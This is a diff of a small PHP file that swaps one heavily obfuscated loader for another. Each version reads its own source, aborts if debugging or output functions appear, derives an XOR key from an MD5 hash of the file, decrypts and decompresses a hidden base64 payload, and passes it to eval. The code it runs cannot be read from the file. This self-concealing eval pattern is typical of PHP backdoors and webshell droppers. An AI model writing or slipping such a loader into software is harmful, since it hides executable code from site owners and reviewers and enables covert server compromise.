@@ -1,24 +1,24 @@
 <?php
-$fazafobokg="eecc3639262616fd7705ead1f6c4f1aa";
-$joqfxyjfcx="00515b550207500b02060206000502560602085154055455070600075e090003";
-$bwlvxhaen="tsHzwXocrPv8ezUw";
-$wzmwzsatza=file_get_contents(__FILE__);
-$bmqybwd=str_replace($bwlvxhaen,"",$wzmwzsatza);
-if(strpos($bmqybwd,"ec"."ho")!==false||strpos($bmqybwd,"pr"."int")!==false||strpos($bmqybwd,"var_"."dump")!==false||strpos($bmqybwd,"file_put_"."contents")!==false||strpos($bmqybwd,"fw"."rite")!==false){die();}
-$kohjmpfynpo=str_replace(array($fazafobokg,$joqfxyjfcx),array("SP_0344ed7e","KP_224e6ab2"),$wzmwzsatza);
-$meaduimqqdz=md5($kohjmpfynpo);
-$pztkizknpxru=hex2bin($joqfxyjfcx);
-$tajgja="";
-$rwopaufbnz=strlen($meaduimqqdz);
-for($krfucznmms=0;$krfucznmms<$rwopaufbnz;$krfucznmms++){
-    $tajgja.=chr(ord($pztkizknpxru[$krfucznmms])^ord($meaduimqqdz[$krfucznmms]));
+$atjphdfr="c351be159c41f60ae18df797e9db39d7";
+$dxndpp="0155500904510050085455095302005852540d005e045d56550a0103020d0207";
+$jjnoerjx="Gry2za3Dekj+/q1z0NEyOS36NrA=";
+$glsvas=file_get_contents(__FILE__);
+$iyxyligxei=str_replace($jjnoerjx,"",$glsvas);
+if(strpos($iyxyligxei,"ec"."ho")!==false||strpos($iyxyligxei,"pr"."int")!==false||strpos($iyxyligxei,"var_"."dump")!==false||strpos($iyxyligxei,"file_put_"."contents")!==false||strpos($iyxyligxei,"fw"."rite")!==false){die();}
+$agivbzfz=str_replace(array($atjphdfr,$dxndpp),array("SP_249bbf11","KP_8463b169"),$glsvas);
+$hbhusuaov=md5($agivbzfz);
+$lxvnsyx=hex2bin($dxndpp);
+$sdesofrrey="";
+$igjoxdsks=strlen($hbhusuaov);
+for($uqgltxwc=0;$uqgltxwc<$igjoxdsks;$uqgltxwc++){
+$sdesofrrey.=chr(ord($lxvnsyx[$uqgltxwc])^ord($hbhusuaov[$uqgltxwc]));
 }
-$cctleb=base64_decode($bwlvxhaen);
-$sgpjdlfssoz=strlen($cctleb);
-$gxaffvyy="";
-$ttoleyc=strlen($tajgja);
-for($krfucznmms=0;$krfucznmms<$sgpjdlfssoz;$krfucznmms++){
-    $gxaffvyy.=$cctleb[$krfucznmms]^$tajgja[$krfucznmms%$ttoleyc];
+$btvrqnc=base64_decode($jjnoerjx);
+$kowszoov=strlen($btvrqnc);
+$qpqcdr="";
+$zbpmngrr=strlen($sdesofrrey);
+for($uqgltxwc=0;$uqgltxwc<$kowszoov;$uqgltxwc++){
+$qpqcdr.=$btvrqnc[$uqgltxwc]^$sdesofrrey[$uqgltxwc%$zbpmngrr];
 }
-$huefxtxwsz="gz"."in"."fl"."ate";
-eval($huefxtxwsz($gxaffvyy));
+$frawszt="gzun"."compress";
+eval('?>' . $frawszt($qpqcdr) . '<?php ');
